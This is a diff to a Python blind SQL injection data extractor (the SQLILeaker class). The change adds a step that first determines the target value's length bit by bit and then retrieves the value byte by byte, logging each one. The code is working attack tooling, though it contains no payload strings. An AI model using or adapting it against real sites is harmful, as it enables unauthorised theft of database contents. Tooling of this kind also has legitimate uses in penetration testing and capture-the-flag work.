@@ -166,9 +166,13 @@ class SQLILeaker(Leaker):
         self.data   = {}
         self.cookies = cookies or {}
         self.method = self.fields['method']
+
+        self.is_determine_length = True
         #
         self.query_fmt = self.fields['query']
+        self.query_length_fmt = self.fields['query_length']
 
+        self.length = 0
         self.values = []
         self.substr_index = 1
 
@@ -194,6 +198,12 @@ class SQLILeaker(Leaker):
 
         return response.text
 
+    def reset(self):
+        # pass to the next
+        self.value = 0
+        self.cmp_value = 2**7
+        self.idx = 7
+
     def update(self, leak):
         result, data = leak
 
@@ -204,21 +214,24 @@ class SQLILeaker(Leaker):
         elif result == SQLIBlindParser.Result.ERROR:
             raise AttributeError('dove cazzo andiamo')
 
-        if self.idx == 0:
-            if self.value == 0:
+        if self.idx == 0: # the last bit is here
+            if self.is_determine_length:
+                logger.info('determined length of %d bytes' % self.value)
+                self.length = self.value
+                self.is_determine_length = False
+            else:
+                # we have retrieved one bytes
+                self.values.append(chr(self.value))
+                self.substr_index += 1
+
+                logger.info('New byte retrieved: %d' % self.value)
+                logger.info(' values: %s' % self.values)
+
+            self.reset()
+
+            if len(self.values) == self.length:
                 raise LeakerEOS('FIXME: end of string?')
 
-            # we have retrieved one bytes
-            self.values.append(chr(self.value))
-            self.substr_index += 1
-
-            logger.info('New byte retrieved: %d' % self.value)
-            logger.info(' values: %s' % self.values)
-
-            # pass to the next
-            self.value = 0
-            self.cmp_value = 2**7
-            self.idx = 7
         else:
             self.idx -= 1
 
